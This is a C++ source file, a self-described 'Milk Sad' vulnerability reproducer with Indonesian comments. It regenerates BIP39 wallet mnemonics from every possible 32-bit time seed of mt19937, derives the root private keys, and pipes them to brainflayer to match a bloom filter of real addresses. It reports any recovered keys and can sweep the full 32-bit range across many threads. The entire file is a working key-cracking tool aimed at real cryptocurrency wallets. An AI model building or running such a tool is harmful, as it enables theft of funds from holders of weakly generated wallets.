/**
 * Milk Sad Vulnerability Reproducer (Upgraded v2 - Deterministik & Efisien)
 * Generates BIP39 Mnemonics (192-bit / 18 Words) based on 32-bit Time Seed
 * Checks against brainflayer via pipe.
 */

#include <iostream>
#include <fstream>
#include <random>
#include <vector>
#include <string>
#include <iomanip>
#include <signal.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sstream>
#include <ctime>
#include <cmath>
#include <stdexcept>
#include <algorithm>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <cctype>
#include <thread>
#include <atomic>
#include <mutex>
#include <chrono>
#include <cstdio>
#include <cstring>
#include <cerrno>
#include <climits>

// --- Configuration ---
const std::string WORDLIST_DIR = "./Wordlist/";
const std::string OUTPUT_FILE_PREFIX = "brainflayer_found_";
const uint64_t REPORT_INTERVAL = 50000; // Report & Check file every N keys per thread
const int DEFAULT_NUM_THREADS = 22; 

// --- Global Flags & Counters ---
std::atomic<bool> g_stop_flag(false);
std::atomic<uint64_t> g_total_found_keys(0); 

// --- Signal Handler ---
void signal_handler(int) {
    g_stop_flag = true;
    std::cout << "\n[!] Interrupt received. Stopping threads..." << std::endl;
}

// --- Helper Functions ---

bool file_exists(const std::string& filename) {
    struct stat buffer;
    return (stat(filename.c_str(), &buffer) == 0);
}

std::vector<std::string> load_wordlist(const std::string& filename) {
    std::vector<std::string> wordlist;
    std::string path = WORDLIST_DIR + filename;
    
    if (!file_exists(path) && file_exists(filename)) {
        path = filename;
    }

    std::ifstream file(path);
    if (!file) {
        throw std::runtime_error("Could not open wordlist: " + path);
    }

    std::string word;
    while (std::getline(file, word)) {
        size_t first = word.find_first_not_of(" \t\r\n");
        if (first == std::string::npos) continue;
        size_t last = word.find_last_not_of(" \t\r\n");
        wordlist.push_back(word.substr(first, (last - first + 1)));
    }

    if (wordlist.size() != 2048) {
        throw std::runtime_error("Wordlist must contain exactly 2048 words. Found: " + std::to_string(wordlist.size()));
    }
    return wordlist;
}

// --- Crypto Functions ---

std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
    SHA256_CTX sha256_ctx;
    SHA256_Init(&sha256_ctx);
    SHA256_Update(&sha256_ctx, data.data(), data.size());
    SHA256_Final(hash.data(), &sha256_ctx);
    return hash;
}

// [UPGRADE 1] Explicit Byte Extraction (Endian-Independent)
// Menggantikan memcpy dengan bit-shifting manual untuk menjamin konsistensi 
// antara sistem Little-Endian dan Big-Endian.
std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {
    std::mt19937 engine(seed_value);

    // 192 bits (24 bytes) of entropy for 18 words
    const int ENTROPY_BYTES = 24; 
    std::vector<uint8_t> entropy(ENTROPY_BYTES);
    
    for (size_t i = 0; i < ENTROPY_BYTES; i += 4) {
        uint32_t random_block = engine();
        
        // Memaksa urutan byte Little-Endian (standar implementasi vuln asli)
        // terlepas dari arsitektur CPU host.
        entropy[i]     = static_cast<uint8_t>(random_block & 0xFF);
        entropy[i + 1] = static_cast<uint8_t>((random_block >> 8) & 0xFF);
        entropy[i + 2] = static_cast<uint8_t>((random_block >> 16) & 0xFF);
        entropy[i + 3] = static_cast<uint8_t>((random_block >> 24) & 0xFF);
    }

    std::vector<uint8_t> hash = sha256(entropy);
    uint8_t checksum_byte = hash[0];

    std::vector<uint8_t> combined = entropy;
    combined.push_back(checksum_byte); 

    std::string mnemonic;
    mnemonic.reserve(200); 

    const int NUM_WORDS = 18;
    for (int i = 0; i < NUM_WORDS; ++i) {
        int start_bit = i * 11;
        int word_index = 0;

        for (int bit = 0; bit < 11; ++bit) {
            int total_bit_pos = start_bit + bit;
            int byte_pos = total_bit_pos / 8;
            int bit_pos_in_byte = 7 - (total_bit_pos % 8); 

            if ((combined[byte_pos] >> bit_pos_in_byte) & 1) {
                word_index |= (1 << (10 - bit));
            }
        }
        if (i > 0) mnemonic += " ";
        mnemonic += wordlist[word_index];
    }
    return mnemonic;
}

std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
    const int iterations = 2048;
    const std::string salt = "mnemonic"; 
    std::vector<uint8_t> seed(64);
    
    if (PKCS5_PBKDF2_HMAC(mnemonic.c_str(), mnemonic.length(),
                          reinterpret_cast<const unsigned char*>(salt.c_str()), salt.length(),
                          iterations, EVP_sha512(), seed.size(), seed.data()) == 0) {
        return "";
    }

    const std::string hmac_key = "Bitcoin seed";
    unsigned char hmac_result[64];
    unsigned int hmac_len;
    
    HMAC(EVP_sha512(), 
         reinterpret_cast<const void*>(hmac_key.c_str()), hmac_key.length(),
         seed.data(), seed.size(), 
         hmac_result, &hmac_len);

    std::stringstream ss;
    ss << std::hex << std::setfill('0');
    for (int i = 0; i < 32; ++i) {
        ss << std::setw(2) << static_cast<int>(hmac_result[i]);
    }
    return ss.str();
}

// --- Time Utilities ---

uint32_t get_unix_timestamp(const std::tm& tm) {
    std::tm temp_tm = tm;
    #ifdef _WIN32
        _putenv("TZ=UTC");
        _tzset();
    #else
        setenv("TZ", "UTC", 1);
        tzset();
    #endif
    
    time_t ts = std::mktime(&temp_tm);
    if (ts == -1) throw std::runtime_error("Invalid time format");
    return static_cast<uint32_t>(ts);
}

std::tm parse_iso_date(const std::string& s) {
    std::tm tm = {};
    std::stringstream ss(s);
    ss >> std::get_time(&tm, "%Y-%m-%d");
    if (ss.fail()) throw std::runtime_error("Parse error. Use YYYY-MM-DD");
    tm.tm_isdst = 0;
    return tm;
}

// --- Worker Thread ---

void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id, 
                   const std::vector<std::string>& wordlist,
                   std::atomic<uint64_t>& global_counter,
                   std::mutex& print_mtx) {
    
    std::string output_filename = OUTPUT_FILE_PREFIX + std::to_string(thread_id) + ".txt";
    // Redirect stderr to stdout to capture everything in one file if needed, usually brainflayer outputs hits to stdout
    std::string cmd = "./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x > " + output_filename + " 2>&1";
    
    FILE* pipe = popen(cmd.c_str(), "w");
    if (!pipe) {
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cerr << "[Thread " << thread_id << "] Error: Failed to open brainflayer pipe." << std::endl;
        return;
    }

    uint64_t local_processed = 0;
    
    // [UPGRADE 3] Incremental File Monitor via Stream Offset
    // Menggunakan tellg() dan seekg() untuk memonitor hanya data baru
    std::streampos last_file_pos = 0;
    size_t local_found_count = 0;
    
    for (uint32_t ts = start_ts; ts <= end_ts && !g_stop_flag; ++ts) {
        std::string mnemonic = generate_mnemonic_bip39(ts, wordlist);
        std::string priv_hex = mnemonic_to_root_key_hex(mnemonic);
        
        if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) break;

        local_processed++;
        global_counter.fetch_add(1, std::memory_order_relaxed);

        if (local_processed % REPORT_INTERVAL == 0) {
            // Check file secara efisien
            std::ifstream monitor(output_filename);
            if (monitor.is_open()) {
                // Cek ukuran file saat ini
                monitor.seekg(0, std::ios::end);
                std::streampos current_pos = monitor.tellg();

                // Jika file bertambah besar dari posisi terakhir kita membaca
                if (current_pos > last_file_pos) {
                    monitor.clear(); // Bersihkan flag EOF
                    monitor.seekg(last_file_pos); // Lompat ke posisi terakhir
                    
                    std::string line;
                    size_t new_hits = 0;
                    while (std::getline(monitor, line)) {
                        if(!line.empty()) new_hits++;
                    }
                    
                    if (new_hits > 0) {
                        g_total_found_keys += new_hits;
                        local_found_count += new_hits;
                        std::lock_guard<std::mutex> lock(print_mtx);
                        std::cout << "\n\033[1;32m[!!!] THREAD " << thread_id << " FOUND " << new_hits << " NEW KEYS!\033[0m" << std::endl;
                    }
                    
                    // Simpan posisi terakhir (sekarang di akhir file)
                    last_file_pos = monitor.tellg();
                }
            }
            
            std::lock_guard<std::mutex> lock(print_mtx);
            std::cout << "[Thread " << thread_id << "] TS: " << ts 
                      << " | Processed: " << local_processed 
                      << " | Found (Local): " << local_found_count << std::endl;
        }
    }

    pclose(pipe);
    
    // Final check untuk sisa output
    {
        std::ifstream monitor(output_filename);
        if (monitor.is_open()) {
            monitor.seekg(last_file_pos);
            std::string line;
            size_t new_hits = 0;
            while (std::getline(monitor, line)) { if(!line.empty()) new_hits++; }
            if (new_hits > 0) {
                g_total_found_keys += new_hits;
                local_found_count += new_hits;
            }
        }
        
        std::lock_guard<std::mutex> lock(print_mtx);
        std::cout << "[Thread " << thread_id << "] Finished. Total: " << local_processed 
                  << " | Found: " << local_found_count << std::endl;
    }
}

// --- Main Menu & Logic ---

int main() {
    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    OpenSSL_add_all_algorithms();

    std::cout << "======================================================" << std::endl;
    std::cout << " Milk Sad Vulnerability Reproducer (Upgraded v2)      " << std::endl;
    std::cout << "======================================================" << std::endl;

    if (!file_exists("./brainflayer/brainflayer")) {
        std::cerr << "Error: ./brainflayer/brainflayer executable not found!" << std::endl;
        return 1;
    }
    if (!file_exists("./040823BF.blf")) {
        std::cerr << "Error: Bloom filter ./040823BF.blf not found!" << std::endl;
        return 1;
    }

    std::vector<std::string> wordlist;
    try {
        std::cout << "[*] Loading english.txt..." << std::endl;
        wordlist = load_wordlist("english.txt");
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }

    int choice;
    std::cout << "\nSelect Mode:\n";
    std::cout << "1. Single Timestamp Check\n";
    std::cout << "2. Date Range Scan (Multithreaded)\n";
    std::cout << "3. Full 32-bit Scan\n";
    std::cout << "> ";
    std::cin >> choice;

    uint32_t start_ts = 0, end_ts = 0;

    if (choice == 1) {
        std::string date_str, time_str;
        std::cout << "Enter Date (YYYY-MM-DD): ";
        std::cin >> date_str;
        std::cout << "Enter Time (HH:MM:SS): ";
        std::cin >> time_str;

        std::tm tm = parse_iso_date(date_str);
        sscanf(time_str.c_str(), "%d:%d:%d", &tm.tm_hour, &tm.tm_min, &tm.tm_sec);
        
        uint32_t ts = get_unix_timestamp(tm);
        std::cout << "\nChecking Timestamp: " << ts << std::endl;
        
        std::string m = generate_mnemonic_bip39(ts, wordlist);
        std::string k = mnemonic_to_root_key_hex(m);
        std::cout << "Mnemonic: " << m << std::endl;
        std::cout << "Root Key: " << k << std::endl;
        
        std::string cmd = "echo " + k + " | ./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x";
        system(cmd.c_str());
        return 0;

    } else if (choice == 2) {
        std::string start_str, end_str;
        std::cout << "Start Date (YYYY-MM-DD): ";
        std::cin >> start_str;
        std::cout << "End Date   (YYYY-MM-DD): ";
        std::cin >> end_str;

        std::tm tm_start = parse_iso_date(start_str);
        std::tm tm_end = parse_iso_date(end_str);
        tm_start.tm_hour = 0; tm_start.tm_min = 0; tm_start.tm_sec = 0;
        tm_end.tm_hour = 23; tm_end.tm_min = 59; tm_end.tm_sec = 59;

        start_ts = get_unix_timestamp(tm_start);
        end_ts = get_unix_timestamp(tm_end);

    } else if (choice == 3) {
        start_ts = 0;
        end_ts = UINT_MAX;
    } else {
        std::cout << "Invalid choice." << std::endl;
        return 1;
    }

    int num_threads_input = DEFAULT_NUM_THREADS;
    std::cout << "Enter number of threads: ";
    if (std::cin.peek() != '\n') std::cin >> num_threads_input;
    if (num_threads_input < 1) num_threads_input = 1;

    // [UPGRADE 2] Safe Partitioning Logic
    uint64_t total_items = (uint64_t)end_ts - start_ts + 1;
    
    // Batasi jumlah thread jika range lebih kecil dari jumlah thread yang diminta
    int num_threads = (total_items < (uint64_t)num_threads_input) ? (int)total_items : num_threads_input;
    if (num_threads < 1) num_threads = 1;

    // Bersihkan file lama
    for(int i=0; i<num_threads; i++) {
        std::string fname = OUTPUT_FILE_PREFIX + std::to_string(i) + ".txt";
        remove(fname.c_str());
    }

    std::cout << "\n[*] Starting Scan..." << std::endl;
    std::cout << "Range: " << start_ts << " to " << end_ts << std::endl;
    std::cout << "Total keys: " << total_items << std::endl;
    std::cout << "Active Threads: " << num_threads << std::endl;

    std::vector<std::thread> threads;
    std::atomic<uint64_t> total_counter(0);
    std::mutex print_mutex;

    // Menghitung chunk size dan sisa pembagian
    uint64_t chunk_size = total_items / num_threads;
    uint64_t remainder = total_items % num_threads;
    
    uint32_t current_start = start_ts;

    for (int i = 0; i < num_threads; ++i) {
        // Distribusikan sisa ke thread-thread awal agar rata
        uint64_t current_chunk = chunk_size + (i < remainder ? 1 : 0);
        uint32_t current_end = current_start + current_chunk - 1;

        threads.emplace_back(worker_thread, current_start, current_end, i, 
                             std::cref(wordlist), 
                             std::ref(total_counter), 
                             std::ref(print_mutex));
        
        // Geser start untuk thread berikutnya (hati-hati overflow uint32 jika mendekati UINT_MAX)
        current_start = current_end + 1;
    }

    // Monitor Loop
    while(!g_stop_flag) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        bool any_running = false;
        // Logic sederhana: kita tunggu di join() bawah, loop ini hanya biar main thread tidak hang
        // Jika ingin exit lebih rapi, bisa tambahkan atomic counter thread aktif.
        // Disini kita gunakan loop ini hanya untuk blocking sampai user kirim interrupt
        // atau kita biarkan flow turun ke join.
        // Karena join() blocking, kita break loop ini jika scan selesai.
        // Untuk sederhananya di console app, kita langsung ke join.
        break; 
    }

    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }

    std::cout << "\n======================================================" << std::endl;
    std::cout << " [!] Scan Complete." << std::endl;
    std::cout << " Total Keys Processed: " << total_counter.load() << std::endl;
    
    uint64_t final_found = g_total_found_keys.load();
    if (final_found > 0) {
        std::cout << "\033[1;32m [SUCCESS] TOTAL KEYS FOUND: " << final_found << " \033[0m" << std::endl;
        std::cout << " Check files named '" << OUTPUT_FILE_PREFIX << "*.txt'" << std::endl;
    } else {
        std::cout << " [RESULT] No keys found in this range." << std::endl;
    }
    std::cout << "======================================================" << std::endl;

    return 0;
}
